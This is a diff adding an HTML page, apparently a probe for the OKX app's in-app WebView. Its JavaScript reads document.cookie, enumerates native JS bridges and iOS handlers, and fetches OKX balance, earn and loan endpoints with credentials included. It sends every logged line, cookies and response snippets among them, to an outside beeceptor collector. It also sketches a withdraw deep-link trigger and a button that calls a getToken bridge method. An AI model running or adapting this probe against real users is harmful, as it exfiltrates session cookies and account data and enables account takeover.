@@ -1,0 +1,79 @@
+<!doctype html>
+<title>OKX WebView probe</title>
+<pre id=log></pre>
+<script>
+const log = (...a) => {
+  document.getElementById('log').textContent += a.join(' ') + '\n';
+  // also beacon every line out so you see results even if WebView is sandboxed/closed
+  navigator.sendBeacon('https://naysser.free.beeceptor.com/c?l=' + encodeURIComponent(a.join(' ')));
+};
+
+log('[+] origin =', location.origin);
+log('[+] UA     =', navigator.userAgent);
+log('[+] cookie =', document.cookie || '(empty)');
+
+// --- 1. enumerate native bridges (Android) ---
+const BRIDGE_NAMES = [
+  'OKApp','OKEXApp','OKXApp','okJsBridge','okxJsBridge','JSBridge','OKXBridge',
+  'CompatibleBridge','okMiniProgram','NewsBridge','AndroidJSBridge','OKWebView',
+  'okexJSBridge','__OKX__','okxAPI','NativeBridge','okJSBridgeCommon',
+  'WebViewJavascriptBridge','OKLua','OkexBridge','okx','okex'
+];
+BRIDGE_NAMES.forEach(n => {
+  if (window[n]) {
+    try {
+      log('[!] BRIDGE FOUND:', n, '→', Object.getOwnPropertyNames(window[n]).join(','));
+    } catch(e){ log('[!] BRIDGE FOUND (opaque):', n); }
+  }
+});
+
+// --- 2. iOS WKWebView handlers ---
+if (window.webkit && window.webkit.messageHandlers) {
+  log('[!] iOS handlers:', Object.keys(window.webkit.messageHandlers).join(','));
+  // try probing common ones
+  ['callHandler','OKBridge','okJsBridge','nativeCall'].forEach(h => {
+    try { window.webkit.messageHandlers[h].postMessage({test:1}); log('  -> posted to', h); } catch(e){}
+  });
+}
+
+// --- 3. walk window for any unexpected objects (non-DOM globals) ---
+const KNOWN = new Set(Object.getOwnPropertyNames(Object.getPrototypeOf(window)).concat(
+  ['document','navigator','location','history','screen','console','localStorage','sessionStorage',
+   'fetch','crypto','Math','JSON','Date','Array','Object','String','Number','Boolean','Promise',
+   'XMLHttpRequest','URL','URLSearchParams','TextEncoder','TextDecoder','Blob','FormData','Headers',
+   'Request','Response','WebSocket','RTCPeerConnection','indexedDB','caches','performance','log']));
+Object.getOwnPropertyNames(window).forEach(k => {
+  if (!KNOWN.has(k) && !k.startsWith('webkit') && typeof window[k] !== 'undefined') {
+    try {
+      const t = typeof window[k];
+      if (t === 'object' || t === 'function') {
+        log('  unknown global:', k, '(' + t + ')',
+            t === 'object' && window[k] ? Object.getOwnPropertyNames(window[k]).slice(0,8).join(',') : '');
+      }
+    } catch(e){}
+  }
+});
+
+// --- 4. can we read okx.com with the WebView's cookie jar? ---
+['https://www.okx.com/api/v5/account/balance',
+ 'https://www.okx.com/priapi/v1/earn/user-asset?valuationUnit=USD',
+ 'https://www.okx.com/priapi/v1/multi-collateral/loans/overview?fiatUnit=USD'].forEach(u => {
+  fetch(u, {credentials:'include', mode:'cors'})
+    .then(r => r.text())
+    .then(t => log('[CORS]', u.slice(0,60), '→', t.slice(0,200)))
+    .catch(e => log('[CORS-blocked]', u.slice(0,60), e.message));
+});
+
+// --- 5. try opaque (no-cors) request to confirm cookies are at least sent ---
+fetch('https://naysser.free.beeceptor.com/probe?cookie-check', {mode:'no-cors'});
+
+// --- 6. attempt to chain back into the app via other okex:// schemes ---
+setTimeout(() => {
+  // these would be attempted only if you want to test transfer/withdraw triggering
+  // location.href = 'okex://wallet/withdraw?...';
+}, 2000);
+
+// --- 7. expose a button for manual bridge poke ---
+document.body.insertAdjacentHTML('beforeend',
+  '<button onclick="try{OKApp.getToken();}catch(e){log(e.message)}">poke OKApp.getToken</button>');
+</script>
